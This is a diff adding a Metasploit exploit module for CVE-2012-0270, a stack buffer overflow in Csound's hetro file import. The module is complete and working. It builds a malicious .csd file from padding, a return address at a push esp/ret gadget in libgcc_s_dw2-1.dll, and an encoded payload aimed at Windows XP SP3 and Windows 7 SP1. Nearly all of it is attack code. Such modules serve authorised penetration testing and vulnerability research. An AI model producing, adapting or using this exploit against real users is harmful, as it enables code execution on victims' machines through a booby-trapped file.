@@ -1,0 +1,77 @@
+##
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see the Metasploit
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
+##
+
+require 'msf/core'
+
+class Metasploit3 < Msf::Exploit::Remote
+	Rank = NormalRanking
+
+	include Msf::Exploit::FILEFORMAT
+
+	def initialize(info = {})
+		super(update_info(info,
+			'Name' => 'Csound hetro File Handling Stack Buffer Overflow',
+			'Description' => %q{
+					This module exploits a buffer overflow in Csound before 5.16.6.
+				The overflow occurs when trying to import a malicious hetro file
+				from tabular format.
+				In order to achieve exploitation the user should import the malicious
+				file through csound with a command like "csound -U het_import msf.csd file.het".
+				This exploit doesn't work if the "het_import" command is used directly
+				to convert the file.
+			},
+			'License' => MSF_LICENSE,
+			'Author' =>
+				[
+					'Secunia', # Vulnerability discovery
+					'juan vazquez' # Metasploit module
+				],
+			'Version' => '$Revision: $',
+			'References' =>
+				[
+					[ 'CVE', '2012-0270' ],
+					[ 'OSVDB', '79491' ],
+					[ 'BID', '52144' ],
+					[ 'URL', 'http://secunia.com/secunia_research/2012-3/' ],
+					[ 'URL', 'http://csound.git.sourceforge.net/git/gitweb.cgi?p=csound/csound5.git;a=commit;h=7d617a9551fb6c552ba16874b71266fcd90f3a6f']
+				],
+			'Payload' =>
+				{
+					'Space' => 650,
+					'BadChars' => "\x00\x0a\x1a\x2c\xff",
+					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff", # Stack adjustment # add esp, -3500
+					'DisableNops' => 'True'
+				},
+			'Platform' => 'win',
+			'Targets' =>
+				[
+					[ 'Csound 5.15 / Windows XP SP3 / Windows 7 SP1',
+						{
+							'Offset' => 132,
+							'Ret' => 0x6e955446 # push esp #  ret / libgcc_s_dw2-1.dll
+						}
+					],
+				],
+			'Privileged' => false,
+			'DefaultTarget' => 0,
+			'DisclosureDate' => 'Feb 23 2012'))
+
+		register_options(
+			[
+				OptString.new('FILENAME', [ false, 'The file name.', 'msf.csd']),
+			], self.class)
+	end
+
+	def exploit
+		sploit = rand_text(target['Offset'])
+		sploit << [target.ret].pack("V")
+		sploit << payload.encoded
+		print_status("Creating '#{datastore['FILENAME']}' file ...")
+		file_create(sploit)
+	end
+
+end
